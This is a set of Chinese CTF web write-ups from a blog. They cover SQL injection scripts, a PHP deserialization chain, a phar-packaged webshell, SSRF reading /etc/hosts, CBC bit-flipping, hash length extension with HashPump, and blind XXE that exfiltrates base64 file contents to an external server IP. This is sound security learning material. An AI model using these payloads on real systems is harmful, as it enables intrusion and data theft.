id=''='a' 都是全表返回查看官方文档 字符串在 = 下比较时会被转为int型可以参看PHP弱比较‘1asdas’会转为1‘asddsad’会转为0再看1select * from users where id='1'='' 返回id=1之外的所有数据 那么可以猜想：第二个等号后的数据决定了 返回id值的数据 or 返回这个id值以外的数据。尝试1234select * from users where id=''=1 // 无结果select * from users where id='1'=1 // 返回id=1select * from users where id='1'=ture//返回id=1select * from users where id='1'=false//返回id=1之外的所有 那么基本可以确定 id=1=0 中 0相当于后置参数它决定了返回的值，当语句仅为 id=1 时，其实默认了后置参数为1。123select * from users where id=1select * from users where id=1=1//两个语句是相同的 那么可以构造一些万能密码 ：1234'=false'='''='asdasdas'... 方法二大佬博客看来的构造语句爆破密码 ORZ123456789101112131415161718import requestsreq=requests.session()lists=\"0123456789abcdefghijklmnopqrstuvwxyz\"flag=''for i in range(50): url=\"http://182.254.247.127:2005/\" ok='' for s in lists: payload=&#123;\"username\":\"1'||passwd&lt;'\"+flag+s+\"'=id#\",\"passwd\":\"\"&#125; print payload r1=req.post(url,data=payload) if \"username\" in r1.text: ok=s else: flag+=ok print flag break post数据12username=1'||passwd&lt;'9989035e268342af1f40f26aad336623'=id#&amp;passwd=9989035e268342af1f40f26aad336623 得到flag 小电影首页提示ffmpegffmpeg的漏洞http://www.freebuf.com/column/142775.htmlexp : https://github.com/neex/ffmpeg-avi-m3u-xbin利用脚本读文件 SecurePY根据提示 知道使用python写的在 python-web 应用中，当前目录下， .py文件生成的pyc文件会被存储在 pycache文件夹中，并以 .cpython-XX.pyc 为扩展名，其中的 XX 与 CPython 版本有关。比如app.py，其对应的 pyc文件路径为 pycache/app.cpython-XX.pyc爆破得到xx为35访问http://123.206.83.157:8000/__pycache__/app.cpython-35.pyc得到源码123456789101112131415161718192021222324252627282930313233343536#!/usr/bin/env python# visit http://tool.lu/pyc/ for more informationfrom flask import Flask, request, jsonify, render_templatefrom Crypto.Cipher import AESfrom binascii import b2a_hex, a2b_heximport osapp = Flask(__name__)flag_key = os.environ['KEY']flag_enc = '9cf742955633f38d9c628bc9a9f98db042c6e4273a99944bc4cd150a0f7b9f317f52030329729ccf80798690667a0add'def index(): return render_template('index.html', flag_enc = flag_enc)index = app.route('/')(index)def getflag(): req = request.json if not req: return jsonify(result = False) if None not in req: return jsonify(result = False) key = req['key'] if len(key) != len(flag_key): return jsonify(result = False) for (x, y) in zip(key, flag_key): if ord(x) ^ ord(y): return jsonify(result = False) cryptor = AES.new(key, AES.MODE_CBC, b'0000000000000000') plain_text = cryptor.decrypt(a2b_hex(flag_enc)) flag = plain_text.decode('utf-8').strip() return jsonify(result = True, flag = flag)getflag = app.route('/getflag', methods = [ 'POST'])(getflag)if __name__ == '__main__': app.run() flag经过AES加密利用1&#123;\"key\":[null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null]&#125; 逐字爆破 如果正确会响应500最后得到key：5ecur3pPYpyPYk3y提交后得到flag。 BabyWrite存在文件包含 尝试都源码1http://120.24.215.80:10012/?page=php://filter/read=convert.base64-encode/resource=index 然后都login1http://120.24.215.80:10012/?page=php://filter/read=convert.base64-encode/resource=login 然后按照方方土的方法 ORZ利用phar协议构造zip压缩包将一个txt文件和php木马打包在一起，由于上传过程中会被插入 =&gt; ，txt文件保护了php文件，使木马可以正常被解压；上传文件后POST指令到PHP文件的位置1234POSTa=system('cat ../../../../d124abbe4cb6aa1621a8ca9519c0f5bf_flag.txt');到http://120.24.215.80:10012/?page=phar://./log/PK%03%04%0a.log/a 拿到flag BabyQuery抓包后看到查询语句1query=&#123; getscorebyid(id: \"GE======\")&#123; id name score &#125; &#125; ‘GE======’base32解码后是 1查询语句1query=&#123; getscorebyid(id: \"1\")&#123; id name score &#125; &#125; 改变结构后尝试注入1&#123; getscorebyyourname(name: \"1' or 'a'='a\")&#123; name score &#125; &#125; 成功 这里数据库是sqlite构造语句1&#123; getscorebyyourname(name: \"1' union select sqlite_version() --\")&#123; name score &#125; &#125; 成功返回版本信息暴表11' union select (select name from sqlite_master where type='table' limit 1,1) -- 查表11' union select (select flag from Secr3t_fl4g) -- ps:可以学习方方土学长写个脚本交互信息 方便很多附上脚本：12345678910import base64import requestsurl=\"http://182.254.247.127:3001/graphql\"payload = base64.b32encode(\"1' union select (select flag from Secr3t_fl4g) --\")go = '&#123; getscorebyyourname(name: \"%s\")&#123; name score &#125; &#125;'%(payload)data = &#123; \"query\" : go&#125;r = requests.post(data=data,url=url)print r.content /…","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"http://altman.vip/tags/wp/"}]},{"title":"CUMTCTF2018","slug":"CUMTCTF2018","date":"2018-01-13T16:00:00.000Z","updated":"2018-11-02T05:49:20.359Z","comments":true,"path":"2018/01/14/CUMTCTF2018/","link":"","permalink":"http://altman.vip/2018/01/14/CUMTCTF2018/","excerpt":"第一次真正意义打比赛和队友一起AK了web题很舒服","text":"第一次真正意义打比赛和队友一起AK了web题很舒服 WEB签到1右键源代码 签到2扫描目录发现robots.txt 打开http://qiandao.bxsteam.xyz/robots.txt 发现flag pop首页面给了源码 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051&lt;?php @error_reporting(1); class sky &#123; protected $skyobj; function __construct() &#123; $this-&gt;skyobj = new sec; &#125; function __toString() &#123; if (isset($this-&gt;skyobj)) return $this-&gt;skyobj-&gt;read(); &#125; &#125; class nosec &#123; public $filename; function read() &#123; $file = \"./&#123;$this-&gt;filename&#125;\"; if (file_get_contents($file)) &#123; return file_get_contents($file); &#125; else &#123; return \"you must be joking!\"; &#125; &#125; &#125; class sec &#123; function read() &#123; return \"it's so sec~~\"; &#125; &#125; if (isset($_GET['data'])) &#123; $Input_data = unserialize($_GET['data']); echo $Input_data; &#125; else &#123; highlight_file(\"./index.php\"); &#125; ?&gt; 读代码可以想到我们的大致目标就是通过 调用__toString() 函数里的1return $this-&gt;skyobj-&gt;read(); 调动read()函数,读文件找flag。大概原理就是上传的data参数在被反序列化的过程中调用_construct()函数，然后直接输出对象引用时调用__toString()，调动read()达到我们的目的。 直接贴代码1234567891011121314151617181920212223242526272829303132333435&lt;?phpclass sky&#123; protected $skyobj; function __construct() &#123; $this-&gt;skyobj = new nosec(); &#125; function __toString() &#123; if (isset($this-&gt;skyobj)) return $this-&gt;skyobj-&gt;read(); &#125;&#125;class nosec&#123; public $filename='flag.php'; function read() &#123; $file = \"./&#123;$this-&gt;filename&#125;\"; if (file_get_contents($file)) &#123; return file_get_contents($file); &#125; else &#123; return \"you must be joking!\"; &#125; &#125;&#125;$aa = new sky();$aa= urlencode(serialize($aa));echo $aa; \\$aa就是构造的data参数。（一定要转url编码！坑！） 把data POST上去flag就出来了。 what？php混淆，解就行了。。没啥说的 解出来的关键代码如下12345678910$IIIIIIIIIIll = @$_GET['img_tet']; $IIIIIIIIIIll = htmlspecialchars($IIIIIIIIIIll); $IIIIIIIIIIll = str_replace('flag', \"\", $IIIIIIIIIIll);if ($IIIIIIIIIIll != \"\") &#123; header('Content-Type: imgage/jpeg'); header('Content-Disposition: attachment; filename='.$IIIIIIIIIIll); header(Content-Lengh: .filesize($IIIIIIIIIIll)); $IIIIIIIIII11 = fopen($IIIIIIIIIIll, \"r\") or die(\"Unable to open file!\"); $IIIIIIIIIlIl = fread($IIIIIIIIII11, filesize($IIIIIIIIIIll)); fclose($IIIIIIIIII11); echo $IIIIIIIIIlIl;&#125; 过滤了flag，用flflagag绕过。 最终payload：1http://confuse.bxsteam.xyz?img_tet=%2f%74%6d%70%2f%66%6c%66%6c%61%67%61%67 rce先fuzz了一波，没发现怎么利用，提示换行后fuzz，还是不会。 最后发现了用uniq 和sort指令都能做出来 %0a换行，%09绕过空格。用通配符 ‘?’ 爆破文件这里直接贴上python脚本123456789101112#! /usr/bin/python2.7import requestsimport urlliburl='http://rce.bxsteam.xyz/index.php'payload=urllib.unquote('%0auniq%09.%3f')for i in range(1,40): payload=urllib.unquote(urllib.quote(payload)+'%3f') data=&#123; \"rce\":payload &#125; r=requests.post(url=url,data=data) print r.content 其中把uniq换成sort也可以。 skysqlsky的sql是真的难。 刚开始想通过：1?id=0'||(select user() like '%')||'0 构造 1 然后通配符逐字爆破。。结果发get不到列名。。就卡住了 提示用联合查询 ，union select 用 union all select select 1，2等价于 select * from ((select 1)A join (select 2)B) 构造出来payload1?id=0' union all select * from ((select 1)A join (select 2)B)%23 但还是找不到列名，百度到大佬的博客讲不用列名的奇淫技巧。。http://www.blogsir.com.cn/safe/495.htmllimit(0,1) 用 limit 1 offset 0构造payload：1?id=0' union all select * from ((select 1)A join (select F.1 from (select * from (select 1)C join (select 2)D join (select 3)E join (select 4)F union all select * from flag limit 1 offset 1)F)B)%23 F.n读取第n列 最终在第四列读到flag1http://skysql.bxsteam.xyz/?id=0' union all select * from ((select 1)A join (select F.4 from (select * from (select 1)C join (select 2)D join (select 3)E join (select 4)F union all select * from flag limit 1 offset 1)F)B)%23 login首先发现源码http://cbc.bxsteam.xyz/login.php~分析后得知是CBC反转攻击。不懂看这里（http://zjw.dropsec.xyz/CTF/2017/04/24/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB.html）不能直接用admin登陆，需要我们更改cipher和token以达到用admin登陆的目的。我们用1dmin和任意密码登陆 得到cipher和token的值这里进行CBC反转攻击，得到新的cipher和token值python脚本如下：123456789101112131415161718# coding=utf-8import base64import urllibiv = base64.b64decode(\"cFvSSjVIp+Uh22ERLFjaUQ==\")plain = base64.b64decode(\"wPiTIz61Ge31LPnnlD1aym1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjE6IjEiO30=\")want = 'a:2:&#123;s:8:\"userna'#print(want[0])first_16 = ''for i in range(16): print i,plain[i],iv[i],want[i] print chr(ord(plain[i]) ^ ord(iv[i]) ^ ord(want[i])) first_16 += chr(ord(plain[i]) ^ ord(iv[i]) ^ ord(want[i]))new_iv = first_16 + iv[16:]print(base64.b64encode(new_iv))print(first_16) 传入网页后成功跳转到amdin界面1http://cbc.bxsteam.xyz/admin.php?url=http://skysec.top/ 默认访问了方方土的博客。。。。显然是SSRF我们直接读取host1http://cbc.bxsteam.xyz/admin.php?url=File:///etc/hosts 得到ip：172.17.0.4访问1cbc.bxsteam.xyz/admin.php?url=172.17.0.4 发现页面源码，明显的文件包含漏洞 直接读取flag.php1http://cbc.bxsteam.xyz/admin.php?url=172.17.0.4/?file=php://filter/read=convert.base64-encode/resource=flag.php 得到base64后的flag.php，解码得到flag。 Xxexxe是什么 打开题目很清楚就是xxe 直接写题解了首先vps放文件file.dtd,内容如下：12&lt;!ENTITY % payl SYSTEM \"php://filter/read=convert.base64-encode/resource=file:///etc/hosts\"&gt;&lt;!ENTITY % int \"&lt;!ENTITY &amp;#37; trick SYSTEM 'http://104.236.236.145/?p=%payl;'&gt;\"&gt; 漏洞处payload1&lt;!DOCTYPE convert [ &lt;!ENTITY % remote SYSTEM \"http://104.236.236.145/file.dtd\"&gt;%remote;%int;%trick;]&gt; 查看服务器log(nginx一般在var/log/nginx/access.log)158.218.185.110 - - [14/Jan/2018:08:16:55 +0000] \"GET /?p=(省略一大串) HTTP/1.0\" 200 3 \"-\" \"-\" base64解码12345678910127.0.0.1 localhost::1 localhost ip6-localhost ip6-loopbackfe00::0 ip6-localnetff00::0 ip6-mcastprefixff02::1 ip6-allnodesff02::2 ip6-allrouters172.17.0.6 flag 5e8af79b12ae xxessrf_flag_1172.17.0.6 flag_1 5e8af79b12ae xxessrf_flag_1172.17.0.6 xxessrf_flag_1 5e8af79b12ae172.17.0.7 74791d7ac29b 嗯？？？？还有一层？？？接着继续读下index123456789101112131415161718192021222324252627282930&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"&gt; &lt;title&gt;XML&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"./bootstrap.min.css\"&gt; &lt;script src=\"./jquery.min.js\"&gt;&lt;/script&gt; &lt;script src=\"./bootstrap.min.js\"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;form role=\"form\" id=\"form\" method=\"POST\" action=\"index.php\"&gt; &lt;div class=\"form-group\"&gt; &lt;label for=\"name\"&gt;XML&lt;/label&gt; &lt;textarea class=\"form-control\" rows=\"6\" name=\"data\" placeholder=\"&lt;code&gt; &lt;body&gt;Hello World!&lt;/body&gt;&lt;/code&gt; \"&gt;&lt;/textarea&gt; &lt;/div&gt; &lt;div class=\"btn-group\"&gt; &lt;button type=\"button\" class=\"btn btn-default\" onclick=\"document.getElementById('form').submit()\"&gt;SUBMIT&lt;/button&gt; &lt;/div&gt; &lt;?php error_reporting(0); include(\"flag.php\"); if(isset($_POST['data']) and $_POST['data'] != \"\") &#123; $xml = simplexml_load_string($_POST['data'], null, LIBXML_NOENT); &#125; ?&gt; &lt;/form&gt; 哦？？圈住include(“flag.php”),尝试直接读,没反应,想着也应该,还有提示SSRF至此,上午工作基本结束,剩下持续发呆直到下午……xxessrf???开始探测内网端口….从8080…..到2018…..嗯中途放弃了…..最后又拿了起来,在队友群又发一下hosts截图 你那个172.17.0.7是啥? …….docker,内网读取flag12&lt;!ENTITY % payl SYSTEM \"php://filter/read=convert.base64-encode/resource=http://172.17.0.6/?file=php://filter/read=convert.base64-encode/resource=flag.php\"&gt;&lt;!ENTITY % int \"&lt;!ENTITY &amp;#37; trick SYSTEM 'http://104.236.236.145/?p=%payl;'&gt;\"&gt; 1UEQ5d2FIQWdDaTh2WldOb2J5QWlZM1Z0ZEdOMFpudENNV2x1TTE5NGVETmZZVzVrWDNOemNtWmZNWE5mUTI5dmJEOTlJanNLUHo0S0NnPT0= … &lt;?php//echo “cumtctf{B1in3_xx3_and_ssrf_1s_Cool?}”;?&gt;","categories":[],"tags":[{"name":"wp","slug":"wp","permalink":"http://altman.vip/tags/wp/"}]},{"title":"哈希长度拓展攻击","slug":"hash长度扩展攻击","date":"2017-12-19T16:00:00.000Z","updated":"2018-11-02T05:49:02.387Z","comments":true,"path":"2017/12/20/hash长度扩展攻击/","link":"","permalink":"http://altman.vip/2017/12/20/hash长度扩展攻击/","excerpt":"实验吧看到的题，之前觉得很难最近有空再做一次记录一下学习过程","text":"实验吧看到的题，之前觉得很难最近有空再做一次记录一下学习过程 0x01 hash函数原理网上有很多讲解，大概就是将明文分为n个区块，在进行多轮运算。大部分明文不能被区块长度整除，所以必须被padding至区块长度的整数倍。然后进行n次运算后得到密文。 0x02 攻击方式当key未知，key的位数已知，md5(key)已知。那么可以求出md5(key+”填充数据”+”任意数据”)。通过一道实验吧的题来理解。源码如下12345678910111213141516171819202122232425262728293031$flag = \"XXXXXXXXXXXXXXXXXXXXXXX\";$secret = \"XXXXXXXXXXXXXXX\"; // This secret is 15 characters long for security!$username = $_POST[\"username\"];$password = $_POST[\"password\"];if (!empty($_COOKIE[\"getmein\"])) &#123; if (urldecode($username) === \"admin\" &amp;&amp; urldecode($password) != \"admin\") &#123; if ($COOKIE[\"getmein\"] === md5($secret . urldecode($username . $password))) &#123; echo \"Congratulations! You are a registered user.\\n\"; die (\"The flag is \". $flag); &#125; else &#123; die (\"Your cookies don't match up! STOP HACKING THIS SITE.\"); &#125; &#125; else &#123; die (\"You are not an admin! LEAVE.\"); &#125;&#125;setcookie(\"sample-hash\", md5($secret . urldecode(\"admin\" . \"admin\")), time() + (60 * 60 * 24 * 7));if (empty($_COOKIE[\"source\"])) &#123; setcookie(\"source\", 0, time() + (60 * 60 * 24 * 7));&#125;else &#123; if ($_COOKIE[\"source\"] != 0) &#123; echo \"\"; // This source code is outputted here &#125;&#125; 要满足要求1$COOKIE[\"getmein\"] === md5($secret . urldecode($username . $password)) 知道了$secret的位数，通过cookie得知md5($secret+admin)=571580b26c65f306376d4f64e53cb5c7。那么通过hash拓展攻击可以满足上面的要求。首先将$secret+admin填充至512bits，然后在加上任意数据例如altman得到新的值X，这里将X进行hash运算，分为两组进行两轮运算。第一组运算md5($secret+admin+填充值)，会发现他与已知md5($secret+admin)相同，那么我们直接利用md5($secret+admin)得到第一轮运算结果。然后通过第一轮运算结果得到第二轮结果，这样我们就在不知道$secret值的情况下算出了md5($secret+admin+”填充值”+”任意数据”)。构造123username=adminpassword=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00altmancookie:getmein=10a4b3dc8626cb07d24bda61be701b9f 成功绕过了1$COOKIE[\"getmein\"] === md5($secret . urldecode($username . $password)) 拿到flag /。 0x03 攻击脚本github有好几个攻击脚本，但是试了试感觉都太麻烦。发现github有个攻击工具很好用。HashPump简单说下安装(linux)12345git clone https://github.com/bwall/HashPumpapt-get install g++ libssl-devcd HashPumpmakemake install 用起来很简单12345# hashpumpInput Signature: 571580b26c65f306376d4f64e53cb5c7 //(已知的hash值)Input Data: adminInput Key Length: 20 //($secret 15位+admin 5位)Input Data to Add: altman //添加的任意数据 然后就会得到payload：1210a4b3dc8626cb07d24bda61be701b9f //md5($secret+admin+passwd)admin\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xc8\\x00\\x00\\x00\\x00\\x00\\x00\\x00altman //构造的passwd 0x04 当无法获取密钥长度时只能通过脚本爆破了，正确的长度会返回不一样的报错信息。","categories":[],"tags":[{"name":"web","slug":"web","permalink":"http://altman.vip/tags/web/"}]}]}